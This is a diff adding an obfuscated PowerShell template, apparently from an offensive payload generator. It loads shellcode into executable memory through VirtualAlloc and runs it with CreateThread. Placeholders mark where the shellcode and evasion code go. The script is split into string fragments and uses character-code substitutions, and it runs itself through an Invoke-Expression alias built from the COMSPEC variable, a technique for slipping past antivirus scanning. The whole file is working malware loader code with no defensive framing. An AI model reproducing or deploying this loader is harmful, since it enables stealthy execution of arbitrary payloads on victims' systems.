@@ -1,0 +1,36 @@
+//####CODE####
+//####EVASION####
+
+('function lookupFunc {
+ '+'   Pa'+'ram (UCmmoduleName, UCmfuncName)                                                                                                               
+                                                                                                                                                           
+    UCmassem = ([App'+'Domain]::'+'CurrentDomain.GetAssem'+'blies() Rw6 ? { UCm_.'+'GlobalAssemblyCa'+'che -And UCm_.Location.Split(0Z2RdVRdV0Z2)[-1].Equals(0Z2System.dll0Z2) }).GetType(0Z2Microsoft.Win32.UnsafeNativeMethods0Z2)                                                                                  
+    UCmtmp = @()                                                                                                                                           
+   '+' UCmasse'+'m.GetMethods() Rw6 % {If(UCm_.Name -eq 34ZGe'+'tProcAddress34Z) {UCmtmp += '+'UCm_}}                                                      
+    '+'ret'+'urn UCmtmp[0].Invoke(UCmnull, @((UCmassem.GetMethod(0Z2Ge'+'tMod'+'uleHandle0Z2)).Invoke(UCmnu'+'ll, @(UCmmo'+'duleName'+')), UCmfuncName))   
+}                                                                                                                                                          
+                                                                                                                                                           
+function getDelegateType {                                                                                                                                 
+    Param (                                                                                                                                                
+        [Parameter(Position=0, Mandatory=UCmTrue)][Type[]] UCmargsTypes,                                                                                   
+        [Par'+'ameter(Positio'+'n=1)][Type] UCmretType = [Void]                                                                                            
+    )                                                                                                                                                      
+                                                                                                                                                           
+    UCmtype = [AppDomain]::Current'+'Domain.DefineDynamicAssembly((New-Object System.Reflection.Asse'+'mblyName(0Z2ReflectedDelegate0Z2)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(0Z2InMemo'+'ryModu'+'le0Z2, UCmfalse).DefineType(0Z2MyDelegateTy'+'pe0Z2, 0Z2Class, Public, Sealed, AnsiClass, AutoClass0Z2, [System.MulticastDelegate])                                                                                                     
+   '+' UCmtype.'+'D'+'efineConstructor(0Z2RTSpecialName, HideBySig, P'+'ublic0Z2, [Syst'+'em.Reflection.CallingConventions]::Standard, UCmargsTypes).SetImplementation'+'Flag'+'s(0Z2Runtime, Managed0Z2)                                                                                                             
+    U'+'Cmtype.DefineMethod(0Z2Invoke0Z2, 0Z2Publ'+'ic, HideBy'+'Sig, NewSlot'+', Virtua'+'l0Z2, UCmretTyp'+'e, UCmargsTypes).SetImplementation'+'Flags(0Z2Run'+'time, Managed0Z2)                                                                                                                                    
+    return UCmtype.CreateType()                                                                                                                            
+}                                                                                                                                                          
+                                                                                                                                                           
+                                                                                                                                                           
+UCmlpMem = [System.Runtime.InteropServices.Ma'+'rshal]:'+':Ge'+'tDelegateForFunctionPointer((lookupFunc kernel32.dll VirtualAlloc), (getDelegat'+'eType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))'+').Invoke([IntPtr'+']'+'::Zero, 0x1000, 0x'+'3000, 0x'+'40)                                            
+[Byte[]] UCmbuf '+'= ####SHELLCODE####
+
+//####CALL####
+
+[System.Runtime.InteropServices.Marshal]:'+':Copy(UCmbuf, 0, UCmlp'+'Mem, UCmb'+'uf.length)                                                                
+                                                                                                                                                           
+UCmhThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookupFunc k'+'ernel32.dll CreateThread), (getDelegateType '+'@([IntP'+'tr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]'+') '+'([IntPtr]))).Invoke([I'+'ntPtr]::Zero, 0, UCmlpMem, '+'[IntPtr]::'+'Zero'+', 0, [IntPtr]::Zero)                                                                                                                                                       
+[System.Runtime.InteropS'+'ervices.Marshal]::'+'GetDelegateForFunctionPointer((lookupFunc kernel32.dll WaitForSing'+'leObject), (getDelegateType '+'@([IntPtr], [Int32]) ([Int])))'+'.Invoke(UCmhThread, 0xFFFFFFFF)                                                                                                  
+                                                                                                                                                           
+').rEpLaCe(([char]85+[char]67+[char]109),[sTring][char]36).rEpLaCe(([char]51+[char]52+[char]90),[sTring][char]34).rEpLaCe('Rw6','|').rEpLaCe(([char]48+[char]90+[char]50),[sTring][char]39).rEpLaCe(([char]82+[char]100+[char]86),[sTring][char]92)|& ( $env:cOMspEc[4,24,25]-Join'') 
